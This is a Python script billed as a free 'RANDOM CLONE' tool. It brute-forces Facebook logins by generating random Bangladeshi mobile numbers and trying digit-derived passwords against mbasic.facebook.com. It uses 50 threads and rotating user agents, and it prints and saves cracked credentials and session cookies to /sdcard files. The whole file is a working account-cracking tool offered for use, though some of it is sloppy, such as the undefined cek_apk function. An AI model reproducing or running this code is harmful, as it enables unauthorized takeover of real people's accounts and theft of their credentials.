
import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
  
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' 
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m' 
#____________Timedate_____________
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 

logo =("""\033[1;32m 
\033[1;32m   
\033[1;32m   
 ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
 ┃ [🔰]AUTHOR    \033[1;32m: \033[1;92mLEGENDARYACE               ┃
 ┃ [🔰]TOOL      \033[1;32m: \033[1;92mRANDOM CLONE               ┃
 ┃ [🔰]STATUS    \033[1;32m: \033[1;92mFREE                       ┃
 ┃ [🔰]SYSTEM    \033[1;32m: \033[1;92mDATA ÷ WIFI                ┃
 ┃ [🔰]GITHUB    \033[1;32m: \033[1;92mLegendhj                   ┃
 ┃ [🔰]FACEBOOK  \033[1;32m: \033[1;92mLegends aryace             ┃
 ┃ [🔰]WHATSAPP  \033[1;32m: \033[1;92m+8801837478901             ┃
 ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛""")
loop = 0
oks = []
cps = []
 
def clear():
    os.system('clear')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"
    
    
try:
    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)
 
#User agents
ugen2=[]
ugen=[]
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()

for agent in range(10000):
        aa='Mozilla/5.0 (Linux; Android 12; moto g(50) 5G Build/S1RSS32.38-20-9-11; wv)'
        b=random.choice(['6','7','8','9','10','11','12'])
        c='Android 12; Motorola Moto G Stylus 5G Build/'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/115.0.5790.127'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/424.0.0.21.75;]'
        anik=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(anik)
          
ugen = ["Mozilla/5.0 (Linux; Android 10; moto g (7)power Build/QPOS30.52-29-7-6; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/114.0.5735.227 Mobile Safari/537.36",]

ugen = ["Mozilla/5.0 (Linux; Android 10; moto g(8) play Build/QMDS30.47-33-5; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.77 Mobile Safari/537.36",]

ugen = ["Mozilla/5.0 (Linux; Android 13; Nokia T10) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",]

ugen = ["Mozilla/5.0 (Linux; Android 8.0.0; Moto Z (2) Build/OPXS27.109-40-22; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/105.0.5195.136 Mobile Safari/537.36",]

ugen = ["Mozilla/5.0 (Linux; Android 11; moto g(10) power) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36",]

ugen = ["Mozilla/5.0 (Linux; arm_64; Android 11; Redmi Note 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/2211.4 Mobile Safari/537.36",]

def uf():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)
    print("\033[1;32m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓")
    print('┃[🇧🇩 EXAMPLE : 017, 018, 019, 016, 9196, 9178┃ ')
    print("\033[1;32m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛")
    mr1 = '0171'
    mr2 = '0172'
    mr3 = '0171'
    mr4 = '0171'
    code = random.choice([mr1,mr2,mr3,mr4]) 
    pww = input(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;92m Choose : ')
    os.system('clear')
    print(logo)
    print("\033[1;32m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓")
    print('┃[🇧🇩]EXAMPLE : 3000, 5000, 10000, 50000┃')
    print("\033[1;32m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛")
    limit = int(input(' [?] Crack Limit : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with ThreadPool(max_workers=50) as morshed:
        clear()
        tl = str(len(user))
        ip = requests.get("https://api.ipify.org").text
        print("\033[1;32m┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓")
        print(" [🔰]\033[97;1m IP ADDRES : \033[38;5;46m"+ip)                  
        print('\033[1;37m [🔰] SIM CODE : \033[38;5;46m'+code)           
        print(f' \033[97;1m[🔰]TOTAL IDS: '+tl)
        print(' \033[1;97m[🔰] Crack has been started      ')
        print(' \033[1;97m[🔰] Wait for ok ids             ')
        print(' \033[1;97m[🔰] Use flight mode for speed up ')
        print("\033[1;32m┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛")
        for love in user:
            pwx = [love[1:]]
            uid = code+love
            morshed.submit(rcrack,uid,pwx,tl)
def rcrack(uid,pwx,tl):
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            sys.stdout.write('\r\33[1;92m[LEGEND][%s/%s][OK-%s]~[CP-%s] \r'%(loop,tl,len(oks),len(cps))),
            sys.stdout.flush()
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'mbasic.facebook.com',
             "method": 'GET',
             "scheme": 'https',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
             'cache-control': 'max-age=0',
             'sec-ch-prefers-color-scheme': 'dark',
             'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
             'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.27"',
             'sec-ch-ua-mobile': '?1',
             'sec-ch-ua-platform': '"Android"',
             'sec-ch-ua-platform-version': '"10.0.0"',
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
             'sec-fetch-site': 'none',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
             'user-agent': pro}
            lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\r\r\033[1;32m[-OK💚] \033[1;32m'+uid+'\033[1;32m • \033[1;32m' +ps+    '  \n[] \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\r\r\33[1;30m[CP] ' +uid+ ' • ' +ps+           '  \33[0;97m')
                open('/sdcard/-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r\33[1;92mLEGEND][%s/%s][OK-%s]\r'%(loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
 
uf()
 
